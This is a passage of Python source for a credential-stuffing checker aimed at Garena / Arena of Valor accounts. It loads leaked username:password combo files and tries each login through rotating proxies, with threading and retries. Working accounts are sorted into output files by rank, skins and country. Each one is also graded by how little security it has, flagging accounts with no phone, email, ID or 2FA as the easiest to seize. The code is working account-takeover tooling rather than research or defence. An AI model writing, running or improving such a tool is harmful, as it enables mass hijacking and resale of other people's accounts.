            if ss_cnt >= 1:
                _save_classified("acc_trang_ss_plus", hit_line, ctry, subdir, foreign_dir)
                return

            try:
                so = int(r.get("shells", 0) or 0)
            except Exception:
                so = 0
            if so > 10:
                _save_classified("acc_trang_so_10_plus", hit_line, ctry, subdir, foreign_dir)
                return

            if aov_lv >= 30:
                _save_classified("acc_trang_lv30_plus", hit_line, ctry, subdir, foreign_dir)
                return

            if aov_lv >= 15:
                _save_classified("acc_trang_lv15_plus", hit_line, ctry, subdir, foreign_dir)
                return

            if ranks.get("chien_tuong"):
                _save_classified("acc_trang_chien_tuong", hit_line, ctry, subdir, foreign_dir)
                return

            if ranks.get("chien_than"):
                _save_classified("acc_trang_chien_than", hit_line, ctry, subdir, foreign_dir, extra_stems=("acc_trang_thach_dau",))
                return

            if ranks.get("master"):
                _save_classified("acc_trang_cao_thu", hit_line, ctry, subdir, foreign_dir)
                return

            if ranks.get("tinh_anh"):
                _save_classified("acc_trang_tinh_anh", hit_line, ctry, subdir, foreign_dir)
                return

            if ranks.get("kim_cuong"):
                _save_classified("acc_trang_kim_cuong", hit_line, ctry, subdir, foreign_dir)
                return

            if ranks.get("bach_kim"):
                _save_classified("acc_trang_bach_kim", hit_line, ctry, subdir, foreign_dir)
                return

            _save_classified("acc_trang", hit_line, ctry, subdir, foreign_dir)
            return

        # Non-trang accs
        try:
            qh = int(((r.get("aov_skins") or {}).get("cp", 0)) or 0)
        except Exception:
            qh = 0
        if qh >= 300:
            _save_target("qh_300_plus.txt", hit_line, foreign_dir=foreign_dir)
            if ctry != "UNKNOWN":
                _save_target("qh_300_plus.txt", hit_line, subdir=subdir, foreign_dir=foreign_dir)
            return

        if ranks.get("chien_tuong"):
            _save_target("rank_chien_tuong.txt", hit_line, foreign_dir=foreign_dir)
            if ctry != "UNKNOWN":
                _save_target("rank_chien_tuong.txt", hit_line, subdir=subdir, foreign_dir=foreign_dir)
            return

        if ranks.get("chien_than"):
            for stem in ("rank_chien_than", "rank_thach_dau"):
                _save_target(f"{stem}.txt", hit_line, foreign_dir=foreign_dir)
                if ctry != "UNKNOWN":
                    _save_target(f"{stem}.txt", hit_line, subdir=subdir, foreign_dir=foreign_dir)
            return

        if ranks.get("master"):
            _save_target("rank_cao_thu.txt", hit_line, foreign_dir=foreign_dir)
            if ctry != "UNKNOWN":
                _save_target("rank_cao_thu.txt", hit_line, subdir=subdir, foreign_dir=foreign_dir)

            stars = int(r.get("aov_rank_stars") or 0) or _extract_master_stars(rank_raw)
            star_file = f"rank_cao_thu_{stars}sao.txt" if (1 <= stars <= 50) else "rank_cao_thu_unknown_sao.txt"
            _save_target(star_file, hit_line, foreign_dir=foreign_dir)
            if ctry != "UNKNOWN":
                _save_target(star_file, hit_line, subdir=subdir, foreign_dir=foreign_dir)
            return

        if ranks.get("kim_cuong"):
            _save_target("rank_kim_cuong.txt", hit_line, foreign_dir=foreign_dir)
            if ctry != "UNKNOWN":
                _save_target("rank_kim_cuong.txt", hit_line, subdir=subdir, foreign_dir=foreign_dir)
            return

        if ranks.get("tinh_anh"):
            _save_target("rank_tinh_anh.txt", hit_line, foreign_dir=foreign_dir)
            if ctry != "UNKNOWN":
                _save_target("rank_tinh_anh.txt", hit_line, subdir=subdir, foreign_dir=foreign_dir)
            return

        # General hit
        _save_target("hit.txt", hit_line, foreign_dir=foreign_dir)
        _save_target("valid.txt", acc_pw, foreign_dir=foreign_dir)

        sk = r.get("aov_skins", {})
        if r.get("aov_name") or sk:
            if is_th:
                _save_target("aov_thailand.txt", hit_line, foreign_dir=foreign_dir)
            elif is_tw:
                _save_target("aov_taiwan.txt", hit_line, foreign_dir=foreign_dir)
            else:
                _save_target("aov.txt", hit_line, foreign_dir=foreign_dir)

            total_skins = sk.get("total_skins", 0) if sk else 0
            if total_skins == 0:
                _save_target("no skin.txt", hit_line, foreign_dir=foreign_dir)
            if sk.get("ss"):
                _save_target("ssSkin.txt", hit_line, foreign_dir=foreign_dir)
            if sk.get("sss"):
                _save_target("sssSkin.txt", hit_line, foreign_dir=foreign_dir)
            if sk.get("anime"):
                _save_target("anime.txt", hit_line, foreign_dir=foreign_dir)
            if sk.get("other"):
                _save_target("otherSkin.txt", hit_line, foreign_dir=foreign_dir)

        if not foreign_dir and ctry != "UNKNOWN":
            _save("hit.txt", hit_line, subdir=subdir)
            _save("valid.txt", acc_pw, subdir=subdir)

    elif status == "INVALID":
        _save("die.txt", acc_pw)
        ctry = (r.get("country") or "").strip().upper() or "UNKNOWN"
        ctry = re.sub(r"[^A-Z0-9_ -]+", "", ctry).strip().replace(" ", "_") or "UNKNOWN"
        _save_tach_acc(acc_pw, status, r, ctry)

    elif status in ("ERROR", "TIMEOUT", "MISS", "NOT_FOUND"):
        detail = r.get("detail", "")
        if status == "NOT_FOUND" or (status == "MISS" and any(code in detail for code in ("result=101", "result=105", "result=174"))):
            return
        _save("error.txt", acc_pw)
        ctry = (r.get("country") or "").strip().upper() or "UNKNOWN"
        ctry = re.sub(r"[^A-Z0-9_ -]+", "", ctry).strip().replace(" ", "_") or "UNKNOWN"
        _save_tach_acc(acc_pw, status, r, ctry, detail=detail)
        if ctry != "UNKNOWN":
            _save("error.txt", acc_pw, subdir=os.path.join("country", ctry))


# ── Combos & CLI ──────────────────────────────────────────────────────────────
def load_combos(filepath: str):
    """Load unique combos from file (format: user:pass or user|pass)."""
    combos = []
    seen = set()
    with open(filepath, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            sep = "|" if "|" in line else ":"
            if sep in line:
                p = line.split(sep, 1)
                acc = p[0].strip()
                pw = p[1].strip()
                key = f"{acc}:{pw}"
                if key not in seen:
                    seen.add(key)
                    combos.append((acc, pw))
    return combos


def main():
    global _QUIET_BULK
    _print_banner()

    args = sys.argv[1:]
    test_login = any(a in ("--test-login", "-t") for a in args)
    args = [a for a in args if a not in ("--info", "-i", "--test-login", "-t")]

    if test_login:
        account = input("Account: ").strip()
        password = input("Password: ").strip()
        use_proxy = input("Proxy file (Enter để bỏ qua): ").strip()
        proxy = None
        if use_proxy:
            proxy_path = use_proxy if os.path.isfile(use_proxy) else os.path.join("combo", use_proxy)
            if os.path.isfile(proxy_path):
                load_proxies(proxy_path)
                proxy = _next_proxy()
        r = check_login(account, password, fetch_info=True, proxy=proxy, debug=True)
        _print_result(r, verbose=True)
        if r.get("status") == "HIT":
            _save_result(r)
        return

    if not args:
        print("Chọn chức năng:")
        print("1. Kiểm tra 1 tài khoản")
        print("2. Quét file combo")
        mode = input("Nhập số (mặc định 2): ").strip() or "2"

        if mode == "1":
            user_in = input("Nhập tài khoản:mật khẩu (hoặc Enter để dùng mặc định): ").strip()
            if ":" in user_in:
                account, password = user_in.split(":", 1)
                account, password = account.strip(), password.strip()
            else:
                account = "tommy199999999"
                password = "quang098"
            print(f"Đang kiểm tra: {account}:{password}")
            use_proxy = input("Proxy file (Enter để bỏ qua): ").strip()
            proxy = None
            if use_proxy:
                proxy_path = use_proxy if os.path.isfile(use_proxy) else os.path.join("combo", use_proxy)
                if os.path.isfile(proxy_path):
                    load_proxies(proxy_path)
                    proxy = _next_proxy()

            r = check_login(account, password, fetch_info=True, proxy=proxy, debug=True)
            _print_result(r, verbose=True)
            if r.get("status") == "HIT":
                _save_result(r)
            return

        os.makedirs("combo", exist_ok=True)
        files = [f for f in os.listdir("combo") if f.lower().endswith(".txt")]
        files.sort()
        if not files:
            print("Không có file .txt trong thư mục combo/")
            return
        print("Chọn file combo:")
        for i, f in enumerate(files, 1):
            print(f"{i}. {f}")
        while True:
            c = input("Nhập số: ").strip()
            if c.isdigit() and 1 <= int(c) <= len(files):
                break
        combo_arg = os.path.join("combo", files[int(c) - 1])
        t = input("Threads (mặc định 5): ").strip()
        threads = int(t) if t.isdigit() and int(t) > 0 else 5
        proxy_in = input("Proxy file (Enter để bỏ qua): ").strip()
        if proxy_in:
            proxy_file = proxy_in if os.path.isfile(proxy_in) else os.path.join("combo", proxy_in)
            args = [combo_arg, str(threads), proxy_file] if os.path.isfile(proxy_file) else [combo_arg, str(threads)]
        else:
            args = [combo_arg, str(threads)]

    combo_arg = args[0] if args else ""
    combo_file = combo_arg if combo_arg and os.path.isfile(combo_arg) else ""
    if not combo_file and combo_arg:
        combo_in_folder = os.path.join("combo", combo_arg)
        if os.path.isfile(combo_in_folder):
            combo_file = combo_in_folder

    if combo_file:
        threads = 5
        proxy_file = None
        for a in args[1:]:
            if a.isdigit():
                threads = max(1, int(a))
            elif os.path.isfile(a):
                proxy_file = a

        if proxy_file:
            load_proxies(proxy_file)
            print(f"Loaded {len(_proxy_list)} proxies from {proxy_file}")
            print(_c(C.YELLOW, "Đang kiểm tra proxy..."))
            validate_proxies(print_fn=print)

        combos = load_combos(combo_file)

        # Lọc bỏ acc đã có trong thư mục res/
        _existing_combos = set()
        if os.path.isdir("res"):
            print(_c(C.YELLOW, "Đang quét các file trong res/ để lọc trùng lặp..."))
            for root, dirs, files in os.walk("res"):
                for f in files:
                    if f.lower().endswith(".txt"):
                        try:
                            with open(os.path.join(root, f), "r", encoding="utf-8", errors="ignore") as fp:
                                for line in fp:
                                    sep = "|" if "|" in line else (":" if ":" in line else None)
                                    if sep:
                                        p = line.split(sep)
                                        _existing_combos.add(f"{p[0].strip()}:{p[1].strip()}")
                        except Exception:
                            pass

        original_size = len(combos)
        combos = [(u, p) for (u, p) in combos if f"{u}:{p}" not in _existing_combos]
        filtered = original_size - len(combos)
        if filtered > 0:
            print(_c(C.GREEN, f"Đã lọc bỏ {filtered} acc đã tồn tại trong res/"))

        total = len(combos)
        if total == 0:
            print(_c(C.RED, "Không còn acc nào mới để check."))
            return

        print(f"Loaded {total} combos | threads={threads}")
        if threads > 500:
            print(_c(C.YELLOW, f"  [!] threads={threads} quá cao có thể gây WinError 10048 (hết port). Khuyên dùng <= 500."))

        hits_lock = threading.Lock()
        _stats = {
            "done": 0, "total": total, "hits": 0, "invalid": 0, "error": 0,
            "white_hits": 0, "white_shells": 0,
        }
        _started_at = time.time()
        _QUIET_BULK = True

        _SKIP_MISS = ("result=101", "result=105", "result=174")

        def _worker(entry):
            idx, acc, pw = entry
            r = None
            for attempt in range(6):
                proxy = _next_proxy()
                r = check_login(acc, pw, fetch_info=True, proxy=proxy)
                is_skip_miss = (
                    r["status"] == "NOT_FOUND" or
                    (r["status"] == "MISS" and any(code in r.get("detail", "") for code in _SKIP_MISS))
                )
                if r["status"] in ("ERROR", "TIMEOUT", "MISS", "CAPTCHA", "PROXY_FAIL") and not is_skip_miss:
                    if attempt < 5:
                        time.sleep(0.5)
                        continue
                break

            with hits_lock:
                _stats["done"] += 1
                if r["status"] == "HIT":
                    _stats["hits"] += 1
                    if _derive_tinh_trang(r) == "Acc Trắng":
                        _stats["white_hits"] += 1
                        try:
                            _stats["white_shells"] += int(r.get("shells", 0) or 0)
                        except Exception:
                            pass
                elif r["status"] == "INVALID":
                    _stats["invalid"] += 1
                elif not is_skip_miss and r["status"] in ("ERROR", "TIMEOUT", "MISS", "PROXY_FAIL", "CAPTCHA"):
                    _stats["error"] += 1
                snap = dict(_stats)

            with _print_lock:
                _print_bulk_status(snap, _started_at)
            _save_result(r)

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                ex.map(_worker, ((i + 1, a, p) for i, (a, p) in enumerate(combos)))
        finally:
            _QUIET_BULK = False

        hits_total = _stats["hits"]
        white_hits_total = _stats.get("white_hits", 0)
        white_shells_total = _stats.get("white_shells", 0)
        print()
        print(_c(C.CYAN + C.BOLD, f"\n{'═' * 50}"))
        print(_c(C.GREEN + C.BOLD, f"  ✔  DONE: {hits_total} HIT / {total} accounts  →  res/"))
        print(_c(C.YELLOW + C.BOLD, f"  ✔  ACC TRẮNG: {white_hits_total} | TỔNG SÒ ACC TRẮNG: {white_shells_total}"))
        print(_c(C.CYAN + C.BOLD, f"{'═' * 50}"))
        return

    # Single check mode from CLI
    if len(args) < 2:
        print("Usage: python check.py <account> <password>")
        print("       python check.py <combo_file.txt> [threads] [proxy.txt]")
        print("       python check.py --test-login")
        print("  threads default = 5")
        return

    account = args[0]
    password = args[1]
    print(f"Checking {account}")
    r = check_login(account, password, fetch_info=True)
    _print_result(r, verbose=True)
    _save_result(r)
    if r["status"] == "HIT":
        print("  -> saved to res/")



from core.aov_database import translate_aov_rank

def _security_flag(value) -> bool:
    """Normalize the mixed boolean/int/string flags returned by Garena."""
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value != 0
    if isinstance(value, str):
        return value.strip().upper() in {"1", "TRUE", "YES", "Y", "ON", "LINKED", "CONNECTED"}
    return False


def _security_text(value) -> str:
    return str(value or "").strip()


def _has_masked_value(value) -> bool:
    """A masked value such as phu****@gmail.com or 33*****91 is still bound."""
    text = _security_text(value)
    if not text:
        return False
    normalized = text.lower()
    if normalized in {"trắng", "trang", "none", "null", "n/a", "no", "false", "0", "không"}:
        return False
    return bool(text.replace("*", "").strip())


def _first_value(mapping: dict, *keys):
    """Return the first non-empty value across Garena field aliases."""
    for key in keys:
        value = mapping.get(key)
        if value is not None and str(value).strip():
            return value
    return ""


def _build_security(raw: dict) -> dict:
    """Build one canonical security snapshot from the protocol result."""
    phone = _security_text(_first_value(
        raw, "aov_prefill_mobile", "fcmobile_prefill_mobile", "masked_phone",
        "mobile_no", "phone", "mobile"
    ))
    email = _security_text(_first_value(
        raw, "masked_email", "email", "email_address", "email_addr"
    ))
    idcard = _security_text(raw.get("idcard"))
    fb_uid = _security_text(raw.get("fb_uid") or raw.get("fb_uid_login"))
    fb_account = _security_text(raw.get("fb_account_name"))
    has_phone = (
        _security_flag(_first_value(raw, "mobile_bound", "mobile_verified", "is_mobile_bound"))
        or _has_masked_value(phone)
    )
    has_email = (
        _security_flag(_first_value(raw, "email_verified", "email_v", "is_email_verified", "email_bound"))
        or _has_masked_value(email)
    )
    has_cccd = bool(idcard.replace("*", "").strip())
    auth_2fa = _security_flag(raw.get("authenticator_enable")) or _security_flag(raw.get("two_step_verify"))
    # The reference checker may expose a truthy string such as "0" from the
    # account-init endpoint. Require actual FB identity data before marking
    # the account as linked.
    fb_linked = bool(fb_uid) or (
        _security_flag(raw.get("fb_linked")) and _has_masked_value(fb_account)
    )

    return {
        "has_phone": has_phone,
        "mobile_bound": _security_flag(_first_value(raw, "mobile_bound", "mobile_verified", "is_mobile_bound")),
        "masked_phone": phone,
        "masked_email": email,
        "email_verified": _security_flag(_first_value(raw, "email_verified", "is_email_verified")),
        "email_v": has_email,
        "has_cccd": has_cccd,
        "idcard": idcard,
        "fb_linked": fb_linked,
        "fb_uid": fb_uid,
        "auth_2fa": auth_2fa,
        "banned": _security_flag(raw.get("aov_banned")),
        "suspicious": _security_flag(raw.get("suspicious")),
    }


def _raw_security_snapshot(raw: dict) -> dict:
    """Keep the original security values without exposing login credentials."""
    fields = (
        "aov_prefill_mobile",
        "fcmobile_prefill_mobile",
        "masked_phone",
        "mobile_bound",
        "masked_email",
        "email_verified",
        "email_v",
        "idcard",
        "authenticator_enable",
        "two_step_verify",
        "fb_linked",
        "fb_uid",
        "fb_uid_login",
        "fb_account_name",
        "aov_banned",
        "suspicious",
    )
    return {key: raw[key] for key in fields if key in raw}


def _derive_security_status(raw: dict, security: dict) -> str:
    """Match the protocol security classification without trusting string truthiness."""
    parts = []
    if security["has_phone"]:
        parts.append("SĐT")
    if security["email_v"]:
        parts.append("Mail")
    if security["fb_linked"]:
        parts.append("FB")
    if security["has_cccd"]:
        parts.append("CCCD")
    if security["auth_2fa"]:
        parts.append("2FA")
    if _security_flag(raw.get("password_set")):
        parts.append("Pass")

    if not parts:
        status = "Acc Trắng"
    elif len(parts) >= 4:
        status = "Full Info"
    else:
        status = "Acc Dính " + " + ".join(parts)

    suffix = []
    if _security_flag(raw.get("aov_banned")):
        suffix.append("BAN")
    try:
        if int(raw.get("suspicious", 0) or 0):
            suffix.append("Suspicious")
    except (TypeError, ValueError):
        pass
    return f"{status} [{' + '.join(suffix)}]" if suffix else status


def parse_combo_line(line: str) -> tuple[str, str]:
    """
    Parse account and password from a line with arbitrary delimiters:
    :, |, ;, tab, slash, double slash, space, etc.
    Examples:
      acc:pass
      acc|pass
      acc;pass
      acc/pass
      acc pass
    """
    line = str(line or "").strip()
    if not line or line.startswith("#"):
        return "", ""

    # Common delimiters in order of priority
    for sep in (":", "|", ";", "\t", "---", "--"):
        if sep in line:
            parts = line.split(sep, 1)
            u, p = parts[0].strip(), parts[1].strip()
            if u and p:
                return u, p

    # Fallback to multiple spaces or single space/slash
    m = re.split(r"[\s/]+", line, maxsplit=1)
    if len(m) >= 2 and m[0].strip() and m[1].strip():
        return m[0].strip(), m[1].strip()

    return "", ""


def derive_accurate_tinh_trang(raw: dict) -> str:
    """Derive account condition using normalized security fields."""
    if not raw or raw.get("status") != "HIT":
        return "Chưa xác định"
    return _derive_security_status(raw, _build_security(raw))


def derive_tinh_trang(raw: dict) -> str:
    """Public status helper; keep CLI, API, and web on the same security rules."""
    return derive_accurate_tinh_trang(raw)


def check_account(account: str, password: str, proxy=None, timeout: int = 10) -> dict:
    """
    Main checking method.
    Returns a unified result dictionary with login status, AOV profile, skins, rank, and security info.
    """
    account = account.strip()
    password = password.strip()

    raw = check_login(account, password, timeout=timeout, fetch_info=True, proxy=proxy)
    status = raw.get("status", "ERROR")

    security = _build_security(raw)
    phone_display = security["masked_phone"]
    mobile_bound = security["mobile_bound"]
    has_phone = security["has_phone"]

    tinh_trang = _derive_security_status(raw, security) if status == "HIT" else "Chưa xác định"
    is_trang = (tinh_trang == "Acc Trắng") and not has_phone
    if has_phone and (is_trang or tinh_trang == "Acc Trắng"):
        is_trang = False
        tinh_trang = "Acc Dính SĐT"

    from core.aov_database import classify_skins, translate_aov_rank

    skins_dict = raw.get("aov_skins") or {}
    owned_ids = skins_dict.get("owned_ids") if isinstance(skins_dict, dict) else None

    if owned_ids:
        classified = classify_skins(owned_ids)
        total_skins = classified["total_skins"]
        total_champs = classified["total_champs"]
        sss_list = classified["sss_list"]
        anime_list = classified["anime_list"]
        ss_list = classified["ss_list"]
        other_list = classified["other_list"]
    else:
        total_skins = int(skins_dict.get("total_skins", 0) or 0) if isinstance(skins_dict, dict) else 0
        total_champs = int(skins_dict.get("total_champs", 0) or 0) if isinstance(skins_dict, dict) else 0
        sss_list = skins_dict.get("sss_list", []) if isinstance(skins_dict, dict) else []
        anime_list = skins_dict.get("anime_list", []) if isinstance(skins_dict, dict) else []
        ss_list = skins_dict.get("ss_list", []) if isinstance(skins_dict, dict) else []
        other_list = skins_dict.get("other_list", []) if isinstance(skins_dict, dict) else []

    rank_name = raw.get("aov_rank") or "Chưa Đấu Hạng"
    rank_translated = translate_aov_rank(rank_name)

    player_name = raw.get("aov_name") or raw.get("username") or ""
    country = raw.get("country") or raw.get("acc_country") or raw.get("country_code") or "VN"

    # Extract latest login specifically for Lien Quan Mobile
    last_login = ""
    for hist in (raw.get("login_history") or []):
        gname = str(hist.get("game") or "").lower()
        if any(x in gname for x in ("liên quân", "aov", "arena of valor", "moba")):
            last_login = hist.get("time") or ""
            break
    if not last_login:
        last_login = raw.get("last_login") or "Chưa ghi nhận"

    level = int(raw.get("aov_level", 0) or 0)
    if level == 0 and rank_translated != "Chưa Đấu Hạng":
        level = 30  # Lien Quan accounts with ranked divisions have achieved level 30

    result = {
        "status": status,
        "account": account,
        "password": password,
        "message": raw.get("detail") or ("Đăng nhập thành công." if status == "HIT" else "Sai tài khoản hoặc mật khẩu."),
        "tinh_trang": tinh_trang,
        "is_trang": is_trang,
        "country": country,
        "last_login": last_login,
        "shells": int(raw.get("shells", 0) or 0),
        "aov": {
            "name": player_name,
            "level": level,
            "rank": rank_translated,
            "stars": int(raw.get("aov_rank_stars", 0) or 0),
            "total_champs": total_champs,
            "total_skins": total_skins,
            "banned": raw.get("aov_banned", "KHÔNG"),
            "reg_time": raw.get("aov_reg_time", ""),
            "sss_count": len(sss_list),
            "sss_list": sss_list,
            "anime_count": len(anime_list),
            "anime_list": anime_list,
            "ss_count": len(ss_list),
            "ss_list": ss_list,
            "other_count": len(other_list),
            "other_list": other_list,
            "cp": skins_dict.get("cp", 0) if isinstance(skins_dict, dict) else 0,
        },
        "security": {
            "has_phone": has_phone,
            "mobile_bound": mobile_bound,
            "masked_phone": phone_display,
            "masked_email": security["masked_email"],
            "email_verified": security["email_verified"],
            "email_v": security["email_v"],
            "has_cccd": security["has_cccd"],
            "idcard": security["idcard"],
            "fb_linked": security["fb_linked"],
            "fb_uid": security["fb_uid"],
            "auth_2fa": security["auth_2fa"],
            "banned": security["banned"],
            "suspicious": security["suspicious"],
            "raw": _raw_security_snapshot(raw),
        },
    }

    # Root-level aliases for direct frontend & DB consumption
    vip_skins_list = sss_list + anime_list + ss_list
    vip_skins_str = ", ".join(vip_skins_list) if vip_skins_list else ""
    splus_skins_str = ", ".join(other_list) if other_list else ""

    result["rank"] = rank_translated
    result["heroes_count"] = total_champs
    result["skins_count"] = total_skins
    result["ingame"] = player_name
    result["skins_vip"] = vip_skins_str
    result["skins_splus"] = splus_skins_str
    result["sss_list"] = sss_list
    result["anime_list"] = anime_list
    result["ss_list"] = ss_list
    result["other_list"] = other_list
    result["tt_info"] = tinh_trang
    result["has_phone"] = has_phone
    result["mobile_bound"] = mobile_bound
    result["masked_phone"] = phone_display
    result["masked_email"] = result["security"]["masked_email"]
    result["email_verified"] = result["security"]["email_verified"]
    result["email_v"] = result["security"]["email_v"]
    result["has_cccd"] = result["security"]["has_cccd"]
    result["idcard"] = result["security"]["idcard"]
    result["fb_linked"] = result["security"]["fb_linked"]
    result["fb_uid"] = result["security"]["fb_uid"]
    result["auth_2fa"] = result["security"]["auth_2fa"]
    result["aov_banned"] = raw.get("aov_banned", "NO")
    result["raw_security"] = result["security"]["raw"]
    result["full_info"] = format_account_full_info(result)

    return result


def format_account_full_info(r: dict) -> str:
    """
    Format exact string requested by user:
    tk:mk | NAME :Shadow Hunter | RANK : Thách Đấu | LEVEL : 64 | HERO : 111 | SKIN : 116 | BAN : KHÔNG | EMAIL : NO [CHƯA XÁC THỰC] | SDT : NO | CMND : YES | AUTHEN : YES | FB : DIE | SÒ : 9 | QUỐC GIA : ID | LOGIN LẦN CUỐI : 21:26:53 09/09/2026 | SS : 1 [Butterfly Kim Ngư Thần Nữ] | SSS : 2 [Tulen Thần Sứ STL‑79, Tulen Chí Tôn Kiếm Tiên] | ANIME : 3 [Allain – Kirito V2, Lữ Bố – Ichigo Kurosaki, Nakroth – Gon Freecss] | OTHER : 110 [] | TRẠNG THÁI : ACC FULL
    """
    if not r:
        return ""

    acc = r.get("account", "")
    pwd = r.get("password", "")
    status = r.get("status", "ERROR")

    if status != "HIT":
        return f"{acc}:{pwd} | STATUS : {status} | DETAIL : {r.get('message', 'Thất bại')}"

    aov = r.get("aov") or {}
    sec = r.get("security") or {}

    name = aov.get("name") or "Chưa đặt tên"
    rank = aov.get("rank") or "Chưa Đấu Hạng"
    stars = aov.get("stars", 0)
    rank_str = f"{rank} {stars} sao" if stars > 0 else rank
    level = aov.get("level", 0)
    hero = aov.get("total_champs", 0)
    skin = aov.get("total_skins", 0)
    ban = "BAN" if _security_flag(aov.get("banned")) else "OK"

    # Email
    masked_email = (sec.get("masked_email") or "").strip()
    if not masked_email or masked_email.lower() in {"trắng", "trang"}:
        email_str = "YES [ĐÃ LIÊN KẾT - KHÔNG CÓ DỮ LIỆU HIỂN THỊ]" if sec.get("email_v") else "NO [CHƯA LIÊN KẾT]"
    else:
        # The protocol treats the masked address as a linked email even when the
        # separate verification flag is unavailable.
        email_str = f"YES [{masked_email}]"

    # SDT
    has_phone = bool(sec.get("has_phone")) or bool(sec.get("mobile_bound"))
    masked_phone = (sec.get("masked_phone") or "").strip()
    if masked_phone and masked_phone.lower() not in {"trắng", "trang"}:
        sdt_str = f"YES [{masked_phone}]"
    elif has_phone:
        sdt_str = "YES [ĐÃ LIÊN KẾT - KHÔNG CÓ DỮ LIỆU HIỂN THỊ]"
    else:
        sdt_str = "NO"

    # CMND / CCCD
    idcard = (sec.get("idcard") or "").strip()
    if sec.get("has_cccd"):
        cmnd_str = f"YES [{idcard}]" if idcard and idcard.replace("*", "").strip() else "YES"
    else:
        cmnd_str = "NO"

    # AUTHEN 2FA (Only app authenticator)
    authen_str = "YES" if sec.get("auth_2fa") else "NO"

    # FB
    fb_linked = sec.get("fb_linked", False)
    fb_uid = (sec.get("fb_uid") or "").strip()
    if fb_linked:
        fb_str = f"YES [{fb_uid}]" if fb_uid else "YES"
    else:
        fb_str = "NO"

    # SO
    shells = r.get("shells", 0)

    # QUOC GIA
    country = (r.get("country") or "VN").upper()

    # LOGIN LAN CUOI
    last_login = r.get("last_login") or "Chưa ghi nhận"

    # SS
    ss_list = aov.get("ss_list") or []
    ss_str = f"{len(ss_list)} [{', '.join(ss_list)}]"

    # SSS
    sss_list = aov.get("sss_list") or []
    sss_str = f"{len(sss_list)} [{', '.join(sss_list)}]"

    # ANIME
    anime_list = aov.get("anime_list") or []
    anime_str = f"{len(anime_list)} [{', '.join(anime_list)}]"

    # OTHER
    other_list = aov.get("other_list") or []
    other_str = f"{len(other_list)} [{', '.join(other_list[:10])}{'...' if len(other_list) > 10 else ''}]"

    # TRANG THAI
    trang_thai = (r.get("tinh_trang") or "CÓ THÔNG TIN").upper()

    return f"{acc}:{pwd} | NAME :{name} | RANK : {rank_str} | LEVEL : {level} | HERO : {hero} | SKIN : {skin} | BAN : {ban} | EMAIL : {email_str} | SDT : {sdt_str} | CMND : {cmnd_str} | AUTHEN : {authen_str} | FB : {fb_str} | SÒ : {shells} | QUỐC GIA : {country} | LOGIN LẦN CUỐI : {last_login} | SS : {ss_str} | SSS : {sss_str} | ANIME : {anime_str} | OTHER : {other_str} | TRẠNG THÁI : {trang_thai}"



